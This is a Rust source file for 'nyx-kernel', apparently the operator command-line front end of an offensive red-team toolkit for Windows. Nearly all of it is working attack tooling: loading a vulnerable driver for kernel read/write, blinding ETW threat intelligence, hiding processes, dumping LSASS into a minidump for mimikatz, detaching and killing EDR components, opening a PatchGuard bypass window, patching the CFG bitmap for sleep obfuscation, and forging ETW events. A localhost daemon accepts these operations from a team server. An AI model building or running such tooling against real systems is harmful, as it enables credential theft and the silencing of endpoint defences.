//! nyx-kernel — operator-side kernel-tier CLI.
//!
//! Drives the full kernel-tier chain:
//!   bootstrap_chain → resolve_offsets → assemble_tier → kit dispatch
//!
//! This is the operational consumer of `nyx-operator-kernelsdk`: it turns the
//! 8 implemented kernel kits (ETW-TI blind, callback neutralize, MiniFilter
//! detach, process hide, PPL strip, LSASS dump, WFP silence, EDR neutralize)
//! from library artifacts into an operator-driven tool.
//!
//! # Safety / authorization
//! Loads a driver (BYOVD path) or opens a kernel device (KslD path) and
//! reads/writes kernel memory. BSOD risk. **Authorized red-team use only.**
//!
//! # Usage (on the Windows target, admin cmd)
//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--flt-rva <hex>]
//!   nyx-kernel blind-etw
//!   nyx-kernel hide <pid>
//!   nyx-kernel dump-lsass <pid>
//!   nyx-kernel neutralize <pid> <freeze|choke|kill>
//!   nyx-kernel detach-minifilter
//!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
//!
//! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
//! All offsets come from the build table (`for_build`) or pattern scan.

// This CLI is Windows-only; the non-Windows stub main() at the bottom
// makes `cargo check` pass on macOS/Linux. On Windows, all the kit code
// compiles but not every kit is reachable from every subcommand, so some
// imports/code paths are flagged by the compiler. Allow them here rather
// than cluttering every function with #[allow] attributes.
#![allow(unused_imports, unreachable_code, dead_code)]

#[cfg(target_os = "windows")]
fn main() {
    use nyx_operator_kernelsdk::{
        win, CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit,
        NeutralizeMethod, PatchGuardKit, PplKit, ProcHideKit,
    };

    // ---- 1. Parse args ----
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!(
            "usage: nyx-kernel <bootstrap|blind-etw|hide<pid>|dump-lsass<pid>|neutralize<pid><m>|detach-minifilter|pg-window> [...]"
        );
        std::process::exit(1);
    }
    let cmd = &args[1];

    // ---- 2. Detect Windows build at runtime (no hardcoding) ----
    let build = detect_build();
    eprintln!("[*] detected Windows build {build}");

    // Resolve EPROCESS offsets from the table (table-driven, version-agnostic).
    let eprocess = match nyx_operator_kernelsdk::offsets::for_build(build) {
        Some(b) => b.offsets,
        None => {
            eprintln!(
                "[!] build {build} not in offset table — kernel-tier operations need a known build or probe fallback"
            );
            std::process::exit(2);
        }
    };

    // Resolve ETW-TI offsets from the table.
    let etw_ti_offsets = match nyx_operator_kernelsdk::etwti::EtwTiOffsets::for_build(build) {
        Some(o) => o,
        None => {
            eprintln!("[!] ETW-TI offsets unknown for build {build}");
            // Non-fatal: ETW-TI ops will be skipped, others still work.
            nyx_operator_kernelsdk::etwti::EtwTiOffsets {
                guid_entry_to_provider_block: 0,
                provider_block_to_enable_info: 0,
                is_enabled_within_enable_info: 0,
            }
        }
    };

    // Parse optional --flt-rva (operator-supplied FltGlobals RVA for MiniFilter).
    let flt_rva = parse_flag_u32(&args, "--flt-rva");

    // Parse optional --byovd <sys> <svc>.
    let (byovd_sys, byovd_svc) = parse_byovd(&args);

    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback ----
    eprintln!("[*] bootstrap_chain (KslD → BYOVD fallback)...");
    let sys_utf16 = byovd_sys.as_ref().map(|s| to_utf16(s));
    let svc_utf16 = byovd_svc.as_ref().map(|s| to_utf16(s));
    let bootstrap = match unsafe {
        win::bootstrap_chain(sys_utf16.as_deref(), svc_utf16.as_deref())
    } {
        Ok(b) => {
            let kind = match &b {
                win::KernelBootstrap::KslD(_) => "KslD",
                win::KernelBootstrap::Byovd(_, _) => "BYOVD",
            };
            eprintln!("[+] bootstrap OK via {kind}");
            b
        }
        Err(e) => {
            eprintln!("[!] bootstrap failed: {e:?}");
            std::process::exit(3);
        }
    };

    // ---- 4. Resolve runtime offsets (pattern scan, autonomous) ----
    let krw_ref = bootstrap.as_kernel_rw();
    eprintln!("[*] resolve_offsets (pattern scan)...");
    let runtime = match win::resolve_offsets(krw_ref, build, flt_rva) {
        Ok(o) => {
            eprintln!(
                "[+] offsets resolved (etw_ti=0x{:x}, ps_head=0x{:x}, flt=0x{:x})",
                o.etw_ti_handle_kva, o.ps_active_process_head_kva, o.flt_globals_kva
            );
            o
        }
        Err(e) => {
            eprintln!("[!] resolve_offsets failed: {e:?}");
            std::process::exit(4);
        }
    };

    // ---- 5. Assemble the tier (consumes bootstrap → owns live KernelRw) ----
    let tier = win::assemble_tier(bootstrap, &runtime, eprocess, etw_ti_offsets, build);
    eprintln!(
        "[+] tier assembled: etw_ti={}, cb={}, mf={}, wfp={}, hide={}, ppl={}, cred={}, neu={}",
        tier.etw_ti.is_some(),
        tier.callbacks.is_some(),
        tier.minifilter.is_some(),
        tier.wfp.is_some(),
        tier.hide.is_some(),
        tier.ppl.is_some(),
        tier.cred.is_some(),
        tier.neutralize.is_some(),
    );

    // ---- 6a. Daemon mode: --serve <port> keeps the tier live and serves
    // kernel ops over a local TCP socket (one persistent bootstrap session,
    // avoiding re-bootstrap + re-pattern-scan per op). JSON line protocol:
    //   {"op":"dump-lsass","pid":684}\n  → {"ok":true,"out_file":"lsass_684.dmp"}\n
    //   {"op":"blind-etw"}               → {"ok":true}\n
    //   {"op":"hide","pid":1234}         → {"ok":true}\n
    //   {"op":"detach-minifilter"}       → {"ok":true}\n
    // Backward-compatible: --serve absent → normal subcommand dispatch below.
    if let Some(port_str) = args.iter().position(|a| a == "--serve").and_then(|i| args.get(i + 1)) {
        if let Ok(port) = port_str.parse::<u16>() {
            return run_daemon(tier, build, port);
        }
        eprintln!("[!] --serve needs a numeric port");
        std::process::exit(1);
    }

    // ---- 6. Dispatch the requested command ----
    match cmd.as_str() {
        "bootstrap" => {
            // Just bootstrap + assemble — the tier is live. Print status.
            eprintln!("[+] bootstrap complete. tier.rw is live. Use a subcommand to drive a kit.");
        }

        "blind-etw" => {
            if let Some(etw) = &tier.etw_ti {
                match etw.blind(&*tier.rw) {
                    Ok(()) => eprintln!("[+] ETW-TI blinded OK"),
                    Err(e) => {
                        eprintln!("[!] ETW-TI blind failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] ETW-TI kit not available (etw_ti_handle_kva was 0)");
                std::process::exit(5);
            }
        }

        "hide" => {
            let pid = parse_pid(&args, 2);
            if let Some(hide) = &tier.hide {
                match hide.hide(&*tier.rw, pid) {
                    Ok(()) => eprintln!("[+] process {pid} hidden (DKOM)"),
                    Err(e) => {
                        eprintln!("[!] hide failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] hide kit not available");
                std::process::exit(5);
            }
        }

        "dump-lsass" => {
            let pid = parse_pid(&args, 2);
            if let Some(cred) = &tier.cred {
                // Use dump_lsass_with_base so we get the captured VA — needed
                // to wrap the raw bytes in a minidump envelope mimikatz parses.
                match cred.dump_lsass_with_base(&*tier.rw, pid) {
                    Ok((bytes, base_va)) => {
                        let path = format!("lsass_{pid}.dmp");
                        if base_va == 0 {
                            // The cred kit didn't resolve the base (floor impl
                            // or a probe failure). Write raw bytes + warn.
                            eprintln!(
                                "[!] base VA unresolved — writing RAW bytes (not a minidump). \
                                 mimikatz will reject this; supply a kernel kit that resolves \
                                 ImageBaseAddress."
                            );
                            match std::fs::write(&path, &bytes) {
                                Ok(()) => eprintln!(
                                    "[+] LSASS raw bytes: {path} ({} bytes)",
                                    bytes.len()
                                ),
                                Err(e) => eprintln!("[!] write failed: {e}"),
                            }
                        } else {
                            // Wrap the raw bytes in a minidump envelope.
                            let dump = nyx_minidump_assembler::assemble_minidump(
                                pid,
                                base_va,
                                &bytes,
                                build,
                            );
                            match std::fs::write(&path, &dump) {
                                Ok(()) => eprintln!(
                                    "[+] LSASS minidump: {path} ({} bytes raw + envelope, \
                                     base_va=0x{base_va:x}, build={build}). \
                                     Parse with mimikatz `sekurlsa::logonpasswords`.",
                                    dump.len()
                                ),
                                Err(e) => eprintln!("[!] write failed: {e}"),
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] dump_lsass failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] cred kit not available");
                std::process::exit(5);
            }
        }

        "neutralize" => {
            let pid = parse_pid(&args, 2);
            let method = match args.get(3).map(|s| s.as_str()) {
                Some("freeze") => NeutralizeMethod::Freeze,
                Some("choke") => NeutralizeMethod::Choke,
                Some("kill") => NeutralizeMethod::Kill,
                _ => {
                    eprintln!("usage: neutralize <pid> <freeze|choke|kill>");
                    std::process::exit(1);
                }
            };
            if let Some(neu) = &tier.neutralize {
                match neu.neutralize(pid, method) {
                    Ok(()) => eprintln!("[+] EDR {pid} neutralized ({:?})", method),
                    Err(e) => {
                        eprintln!("[!] neutralize failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!("[!] neutralize kit not available");
                std::process::exit(5);
            }
        }

        "detach-minifilter" => {
            if let Some(mf) = &tier.minifilter {
                match mf.detach_edr(&*tier.rw) {
                    Ok(()) => eprintln!("[+] EDR MiniFilters detached"),
                    Err(e) => {
                        eprintln!("[!] detach failed: {e:?}");
                        std::process::exit(5);
                    }
                }
            } else {
                eprintln!(
                    "[!] minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)"
                );
                std::process::exit(5);
            }
        }

        "pg-window" => {
            // Enter a PatchGuard unchecked window. select_pg_window picks the
            // best available bypass for the current build (RuntimePgBypass on
            // Win11 24H2+, TimingRepair on Win10/early Win11). The window
            // borrows tier.rw for the duration — we hold the guard until the
            // operator signals completion, then Drop repairs PG state.
            eprintln!("[*] selecting PatchGuard window for build {build}...");
            let window_kind = if build >= 26100 { "RuntimePgBypass" } else { "TimingRepair" };
            match win::select_pg_window(build, &*tier.rw) {
                Some(kit) => {
                    eprintln!("[+] selected {window_kind} window; entering unchecked window...");
                    match kit.enter_unchecked(&*tier.rw) {
                        Ok(_guard) => {
                            eprintln!("[+] PatchGuard unchecked window OPEN — DKOM edits safe");
                            eprintln!("[*] press ENTER to close the window (Drop repairs PG)...");
                            // Block on stdin until the operator signals completion.
                            // The guard lives until this closure returns; Drop runs on exit.
                            let mut line = String::new();
                            let _ = std::io::stdin().read_line(&mut line);
                            eprintln!("[+] closing window — PG repair running on Drop");
                            // _guard drops here, invoking the repair callback.
                        }
                        Err(e) => {
                            eprintln!("[!] enter_unchecked failed (PG context not in safe state): {e:?}");
                            eprintln!("    retry when PG is between validation cycles (~5min gap)");
                            std::process::exit(5);
                        }
                    }
                }
                None => {
                    eprintln!(
                        "[!] no PatchGuard window available for build {build} (no PG-context offsets or not x86_64)"
                    );
                    std::process::exit(5);
                }
            }
        }

        "cfg-bypass" => {
            // Mark NtContinue as valid CFG call target via kernel r/w.
            // Enables Ekko/Foliage sleep obfuscation on CFG-enabled processes.
            let nt_continue = unsafe {
                let ntdll = winapi_get_module_handle("ntdll.dll\0");
                if ntdll.is_null() {
                    eprintln!("[!] ntdll not found");
                    std::process::exit(5);
                }
                winapi_get_proc_address(ntdll, "NtContinue\0".as_ptr())
            };
            if nt_continue.is_null() {
                eprintln!("[!] NtContinue not found in ntdll");
                std::process::exit(5);
            }
            let nt_continue_addr = nt_continue as usize;
            eprintln!("[*] NtContinue at 0x{nt_continue_addr:x}");

            let init_block = unsafe {
                let ntdll = winapi_get_module_handle("ntdll.dll\0");
                winapi_get_proc_address(ntdll, "LdrSystemDllInitBlock\0".as_ptr())
            };
            if init_block.is_null() {
                eprintln!("[!] LdrSystemDllInitBlock not found");
                std::process::exit(5);
            }
            let init_addr = init_block as usize;
            let block_size = unsafe { *(init_addr as *const u32) } as usize;
            eprintln!("[*] LdrSystemDllInitBlock size = 0x{block_size:x}");

            let cfg_off: usize = if block_size <= 0x70 { 0x40 }
                else if block_size <= 0xF8 { 0x60 }
                else { 0x68 };

            let bitmap_addr = unsafe { *((init_addr + cfg_off) as *const usize) };
            let bitmap_size = unsafe { *((init_addr + cfg_off + 8) as *const usize) };
            eprintln!("[*] CFG bitmap at 0x{bitmap_addr:x}, size 0x{bitmap_size:x}");
            if bitmap_addr == 0 || bitmap_size == 0 {
                eprintln!("[!] CFG bitmap unavailable");
                std::process::exit(5);
            }

            let bit = nt_continue_addr >> 4;
            let boff = bit >> 3;
            let bpos = (bit & 7) as u8;
            if boff >= bitmap_size {
                eprintln!("[!] address outside bitmap");
                std::process::exit(5);
            }

            let va = bitmap_addr + boff;
            let mut buf = [0u8; 1];
            tier.rw.kread(va, &mut buf).unwrap_or_else(|e| {
                eprintln!("[!] CFG bitmap read failed: {e:?}");
                std::process::exit(5);
            });
            let old = buf[0];
            let was = (old >> bpos) & 1;
            buf[0] |= 1 << bpos;
            if buf[0] != old {
                tier.rw.kwrite(va, &buf).unwrap_or_else(|e| {
                    eprintln!("[!] CFG bitmap write failed: {e:?}");
                    std::process::exit(5);
                });
                eprintln!("[+] NtContinue CFG bit SET (off={boff}, bit={bpos})");
            } else {
                eprintln!("[+] already set (off={boff}, bit={bpos})");
            }
            eprintln!("[*] old={old:#04x} new={:#04x} was_set={was}", buf[0]);
        }

        "forge-etw" => {
            // ETW event forgery — drives the otherwise-dead etw_deception module.
            // Generates a synthetic Process Start event buffer (structurally
            // identical to a real Microsoft-Windows-Kernel-Process event) and
            // writes it to a file for operator review / NtTraceEvent injection.
            //
            // Usage: forge-etw <parent_pid> <child_pid> <image_name> [output.bin]
            let parent_pid = args
                .get(2)
                .and_then(|s| s.parse::<u32>().ok())
                .unwrap_or(4);
            let child_pid = args
                .get(3)
                .and_then(|s| s.parse::<u32>().ok())
                .unwrap_or(1234);
            let image_name = args.get(4).cloned().unwrap_or_else(|| {
                r"C:\Windows\System32\svchost.exe".to_string()
            });
            let out_path = args.get(5).cloned().unwrap_or_else(|| {
                format!("forge_etw_proc_create_{child_pid}.bin")
            });

            let deceiver = nyx_operator_kernelsdk::etw_deception::EtwDeceiver::with_kernel_defaults();
            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as u64;
            let buf = deceiver.forge_process_create(
                parent_pid,
                child_pid,
                image_name.as_bytes(),
                timestamp,
            ).map_err(|e| {
                eprintln!("[!] forge_process_create failed: {e}");
                std::process::exit(5);
            }).unwrap();
            match std::fs::write(&out_path, &buf) {
                Ok(()) => eprintln!(
                    "[+] forged Process Start event ({} bytes) written to {out_path}\n    \
                     parent={parent_pid} child={child_pid} image=\"{image_name}\"\n    \
                     inject via NtTraceEvent(session_handle, 0, buf.len(), buf)",
                    buf.len()
                ),
                Err(e) => {
                    eprintln!("[!] failed to write {out_path}: {e}");
                    std::process::exit(5);
                }
            }
        }

        _ => {
            eprintln!("unknown command: {cmd}");
            std::process::exit(1);
        }
    }

    eprintln!("[+] done");
}

// ---- Runtime build detection (no hardcoded version) ----

/// Detect the Windows build number via `RtlGetVersion`. Works on 7–11 25H2.
/// Returns 0 on failure (the table lookup will then fail cleanly).
#[cfg(target_os = "windows")]
fn detect_build() -> u32 {
    #[repr(C)]
    struct RtlOsVersionInfoExW {
        os_version_info_size: u32,
        major_version: u32,
        minor_version: u32,
        build_number: u32,
        platform_id: u32,
        sz_csd_version: [u16; 128],
        service_pack_major: u16,
        service_pack_minor: u16,
        suite_mask: u16,
        product_type: u8,
        reserved: u8,
    }

    extern "system" {
        fn RtlGetVersion(info: *mut RtlOsVersionInfoExW) -> i32;
    }

    let mut info = RtlOsVersionInfoExW {
        os_version_info_size: core::mem::size_of::<RtlOsVersionInfoExW>() as u32,
        major_version: 0,
        minor_version: 0,
        build_number: 0,
        platform_id: 0,
        sz_csd_version: [0; 128],
        service_pack_major: 0,
        service_pack_minor: 0,
        suite_mask: 0,
        product_type: 0,
        reserved: 0,
    };

    // SAFETY: RtlGetVersion fills the struct; the size field is set correctly.
    let status = unsafe { RtlGetVersion(&mut info) };
    if status == 0 {
        info.build_number
    } else {
        0
    }
}

// ---- §P3.b Daemon mode: persistent kernel session over TCP ----
//
// One bootstrap (KslD/BYOVD load + resolve_offsets pattern scan) amortised
// across many ops. JSON line protocol on localhost — the team server's
// /api/lsass handler (P3.c) connects as a client and posts ops.

/// Run the kernel-tier daemon: bind a localhost TCP socket, accept one
/// connection at a time, and dispatch JSON ops against the live `tier`.
/// Each op is a single line `{"op":"...","pid":N}`; the reply is a single
/// line JSON `{"ok":true,...}` or `{"ok":false,"err":"..."}`.
#[cfg(target_os = "windows")]
fn run_daemon(
    tier: nyx_operator_kernelsdk::KernelTier,
    build: u32,
    port: u16,
) -> ! {
    use nyx_operator_kernelsdk::{
        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
    };
    use std::io::{BufRead, BufReader, Write};
    use std::net::TcpListener;

    let bind = format!("127.0.0.1:{port}");
    let listener = match TcpListener::bind(&bind) {
        Ok(l) => {
            eprintln!("[+] nyx-kernel daemon listening on {bind} (build {build})");
            l
        }
        Err(e) => {
            eprintln!("[!] bind {bind} failed: {e}");
            std::process::exit(6);
        }
    };

    for stream in listener.incoming() {
        let mut stream = match stream {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[!] accept failed: {e}");
                continue;
            }
        };
        let peer = stream
            .peer_addr()
            .map(|a| a.to_string())
            .unwrap_or_else(|_| "?".into());
        eprintln!("[*] daemon: client {peer} connected");
        let reader = BufReader::new(stream.try_clone().expect("clone stream"));
        for line in reader.lines() {
            let line = match line {
                Ok(l) => l,
                Err(_) => break,
            };
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            let reply = dispatch_daemon_op(trimmed, &tier, build);
            let reply_line = format!("{reply}\n");
            if stream.write_all(reply_line.as_bytes()).is_err() {
                break;
            }
            eprintln!("[*] daemon: {peer} → {trimmed} → {reply}");
        }
        eprintln!("[*] daemon: client {peer} disconnected");
    }
    // listener.incoming() only ends on error; unreachable in practice.
    unreachable!("daemon listener loop exited");
}

/// Dispatch one daemon op. Tiny hand-rolled JSON parser (no serde dep) — we
/// only recognise `op` (string) and `pid` (number). Returns a JSON reply line.
#[cfg(target_os = "windows")]
fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
    use nyx_operator_kernelsdk::{
        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, ProcHideKit,
    };

    let op = json_string_field(line, "op").unwrap_or_default();
    let pid = json_number_field(line, "pid").unwrap_or(0);

    match op.as_str() {
        "dump-lsass" => {
            if let Some(cred) = &tier.cred {
                match cred.dump_lsass_with_base(&*tier.rw, pid) {
                    Ok((bytes, base_va)) => {
                        if base_va == 0 {
                            return json_err("base VA unresolved — raw bytes only");
                        }
                        let dump = nyx_minidump_assembler::assemble_minidump(
                            pid, base_va, &bytes, build,
                        );
                        let path = format!("lsass_{pid}.dmp");
                        if std::fs::write(&path, &dump).is_err() {
                            return json_err("write failed");
                        }
                        format!(
                            r#"{{"ok":true,"out_file":"{path}","bytes":{},"base_va":"0x{:x}"}}"#,
                            dump.len(), base_va
                        )
                    }
                    Err(e) => json_err(&format!("dump_lsass: {e:?}")),
                }
            } else {
                json_err("cred kit not assembled")
            }
        }
        "blind-etw" => {
            if let Some(etw) = &tier.etw_ti {
                match etw.blind(&*tier.rw) {
                    Ok(()) => json_ok(),
                    Err(e) => json_err(&format!("blind-etw: {e:?}")),
                }
            } else {
                json_err("etw_ti kit not assembled")
            }
        }
        "hide" => {
            if let Some(hide) = &tier.hide {
                match hide.hide(&*tier.rw, pid) {
                    Ok(()) => json_ok(),
                    Err(e) => json_err(&format!("hide: {e:?}")),
                }
            } else {
                json_err("hide kit not assembled")
            }
        }
        "detach-minifilter" => {
            if let Some(mf) = &tier.minifilter {
                match mf.detach_edr(&*tier.rw) {
                    Ok(()) => json_ok(),
                    Err(e) => json_err(&format!("detach-minifilter: {e:?}")),
                }
            } else {
                json_err("minifilter kit not assembled (supply --flt-rva)")
            }
        }
        "status" => {
            // Report which kits are live — useful for the team-server probe.
            format!(
                r#"{{"ok":true,"build":{build},"etw_ti":{},"minifilter":{},"hide":{},"cred":{}}}"#,
                tier.etw_ti.is_some(),
                tier.minifilter.is_some(),
                tier.hide.is_some(),
                tier.cred.is_some()
            )
        }
        other => json_err(&format!("unknown op: {other}")),
    }
}

/// Extract a JSON string field value `"key":"value"` → `value`. Tiny hand-rolled
/// parser — avoids a serde dependency for the daemon's 4-op protocol.
#[cfg(target_os = "windows")]
fn json_string_field(line: &str, key: &str) -> Option<String> {
    let needle = format!("\"{key}\":\"");
    let start = line.find(&needle)? + needle.len();
    let rest = &line[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

/// Extract a JSON number field value `"key":N` → N. Tiny hand-rolled parser.
#[cfg(target_os = "windows")]
fn json_number_field(line: &str, key: &str) -> Option<u32> {
    let needle = format!("\"{key}\":");
    let start = line.find(&needle)? + needle.len();
    let rest = line[start..].trim_start();
    let end = rest
        .find(|c: char| !c.is_ascii_digit())
        .unwrap_or(rest.len());
    rest[..end].parse().ok()
}

#[cfg(target_os = "windows")]
fn json_ok() -> String {
    r#"{"ok":true}"#.to_string()
}

#[cfg(target_os = "windows")]
fn json_err(msg: &str) -> String {
    // Escape any embedded quotes in the message.
    let escaped: String = msg.replace('\\', "\\\\").replace('"', "\\\"");
    format!(r#"{{"ok":false,"err":"{escaped}"}}"#)
}

// ---- Helpers ----

#[cfg(target_os = "windows")]
fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn parse_flag_u32(args: &[String], flag: &str) -> Option<u32> {
    let idx = args.iter().position(|a| a == flag)?;
    args.get(idx + 1)?.trim_start_matches("0x").parse().ok()
}

#[cfg(target_os = "windows")]
fn parse_byovd(args: &[String]) -> (Option<String>, Option<String>) {
    let idx = match args.iter().position(|a| a == "--byovd") {
        Some(i) => i,
        None => return (None, None),
    };
    (args.get(idx + 1).cloned(), args.get(idx + 2).cloned())
}


#[cfg(target_os = "windows")]
fn parse_pid(args: &[String], pos: usize) -> u32 {
    args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
}


// ---- Windows FFI helpers for cfg-bypass ----
#[cfg(target_os = "windows")]
extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut core::ffi::c_void;
    fn GetProcAddress(hModule: *mut core::ffi::c_void, lpProcName: *const u8) -> *mut core::ffi::c_void;
}

#[cfg(target_os = "windows")]
unsafe fn winapi_get_module_handle(name: &str) -> *mut core::ffi::c_void {
    unsafe { GetModuleHandleA(name.as_ptr()) }
}

#[cfg(target_os = "windows")]
unsafe fn winapi_get_proc_address(h: *mut core::ffi::c_void, name: *const u8) -> *mut core::ffi::c_void {
    unsafe { GetProcAddress(h, name) }
}
// ---- Non-Windows stub (so `cargo check` on macOS doesn't hard-error) ----
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "nyx-kernel: Windows-only tool. This binary must be built and run on a Windows target."
    );
    eprintln!("Build with: cargo +nightly build --release --target x86_64-pc-windows-msvc");
    std::process::exit(1);
}
